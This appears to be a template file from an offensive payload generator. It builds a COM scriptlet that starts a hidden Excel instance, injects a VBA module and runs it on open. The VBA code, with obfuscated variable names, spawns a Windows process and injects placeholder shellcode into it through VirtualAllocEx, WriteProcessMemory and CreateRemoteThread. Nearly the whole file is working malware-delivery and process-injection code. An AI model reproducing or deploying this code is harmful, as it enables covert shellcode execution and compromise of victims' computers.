[ShellCode]
value: notSet
process: decEncode

[RedirectorDomain]
value: notSet

[RedirectorPort]
value: notSet

[Processx86]
value: notSet

[Processx64]
value: notSet

[ProgID]
value: notSet

[ClassID]
value: notSet

[Template]
data:	<?XML version="1.0"?>
		<scriptlet>
		<registration 
		    progid="newTest"
		    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
			<script language="VBScript">
				<![CDATA[	
					Function Register
						MsgBox ""
					End Function
				]]>
			</script>
		</registration>

		<public>
			<method name="Test"></method>
		</public>

		<script language="VBScript">
			<![CDATA[	

			Function Test()
				Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
				
				Set objExcel = CreateObject("Excel.Application")
				objExcel.Visible = False
			
				Application_Version = objExcel.Version	
				Set WshShell = CreateObject("Wscript.Shell")
				
				strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application_Version & "\Excel\Security\AccessVBOM"
			
				Set objWorkbook = objExcel.Workbooks.Add()
				Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
				strCode = ${Processing:value}
				xlmodule.CodeModule.AddFromString strCode
				objExcel.DisplayAlerts = False
				objExcel.Run "Auto_Open"
				objWorkbook.Close False
				objExcel.Quit
			End Function
			
			]]>
		</script>
		</scriptlet>

[Processing]
value: Private Type PROCESS_INFORMATION
		    hProcess As Long
		    hThread As Long
		    dwProcessId As Long
		    dwThreadId As Long
		End Type

		Private Type STARTUPINFO
		    cb As Long
		    lpReserved As String
		    lpDesktop As String
		    lpTitle As String
		    dwX As Long
		    dwY As Long
		    dwXSize As Long
		    dwYSize As Long
		    dwXCountChars As Long
		    dwYCountChars As Long
		    dwFillAttribute As Long
		    dwFlags As Long
		    wShowWindow As Integer
		    cbReserved2 As Integer
		    lpReserved2 As Long
		    hStdInput As Long
		    hStdOutput As Long
		    hStdError As Long
		End Type

	#If Vba7 Then
		Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal Lujkda As Long, ByVal Dtzxcng As Long, ByVal Yioyj As Long, ByVal Yfjycwjg As LongPtr, Kinxmvupb As Long, ByVal Ggi As Long, Klknqy As Long) As LongPtr
		Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal Ghnpli As Long, ByVal Euqqh As Long, ByVal Ggwfz As Long, ByVal Ctewr As Long, ByVal Nws As Long) As LongPtr
		Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal Rxzgi As Long, ByVal Yuugx As LongPtr, ByRef Ussxg As Any, ByVal Ljiha As Long, ByVal Kplos As LongPtr) As LongPtr
		Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal Ilopa As String, ByVal Apvbbs As String, Oulgxza As Any, Iuldf As Any, ByVal Wulaxn As Long, ByVal Bcdlpia As Long, Yulimz As Any, ByVal Qjilvf As String, Jmexuiz As STARTUPINFO, Lixsuin As PROCESS_INFORMATION) As Long
	#Else
		Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal Lujkda As Long, ByVal Dtzxcng As Long, ByVal Yioyj As Long, ByVal Yfjycwjg As LongPtr, Kinxmvupb As Long, ByVal Ggi As Long, Klknqy As Long) As LongPtr
		Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal Ghnpli As Long, ByVal Euqqh As Long, ByVal Ggwfz As Long, ByVal Ctewr As Long, ByVal Nws As Long) As LongPtr
		Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal Rxzgi As Long, ByVal Yuugx As LongPtr, ByRef Ussxg As Any, ByVal Ljiha As Long, ByVal Kplos As LongPtr) As LongPtr
		Private Declare Function CreateProcessA Lib "kernel32" (ByVal Ilopa As String, ByVal Apvbbs As String, Oulgxza As Any, Iuldf As Any, ByVal Wulaxn As Long, ByVal Bcdlpia As Long, Yulimz As Any, ByVal Qjilvf As String, Jmexuiz As STARTUPINFO, Lixsuin As PROCESS_INFORMATION) As Long
	#EndIf

	Sub Auto_Open()
		Dim Nmpila As PROCESS_INFORMATION
		Dim Ilmpo As STARTUPINFO
		Dim Ulnma As String
		Dim Kox As Long, Dbrfrvj As Variant, Kycfoqoc As Long
	#If Vba7 Then
		Dim  Coefj As LongPtr, Bmqfu As LongPtr
	#Else
		Dim  Coefj As Long, Bmqfu As Long
	#EndIf
		Dbrfrvj = ${ShellCode:value}

		If Len(Environ("ProgramW6432")) > 0 Then
		    Excda = Environ("windir") & "\\SysWOW64\\${Processx64:value}"
		else
		    Excda = Environ("windir") & "\\System32\\${Processx86:value}"
		End If

		Bmqfu = CreateProcessA(Ulnma, Excda, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, Ulnma, Ilmpo, Nmpila)
		Coefj = VirtualAllocEx(Nmpila.hProcess, 0, UBound(Dbrfrvj), &H1000, &H40)
		For Kycfoqoc = LBound(Dbrfrvj) To UBound(Dbrfrvj)
			Kox = Dbrfrvj(Kycfoqoc)
			Bmqfu = WriteProcessMemory(Nmpila.hProcess, Coefj + Kycfoqoc, Kox, 1, ByVal 0&)
		Next Kycfoqoc
		Bmqfu = CreateRemoteThread(Nmpila.hProcess, 0, 0, Coefj, 0, 0, 0)
	End Sub
	Sub AutoOpen()
		Auto_Open
	End Sub
	Sub Workbook_Open()
		Auto_Open
	End Sub
process: chrEncode

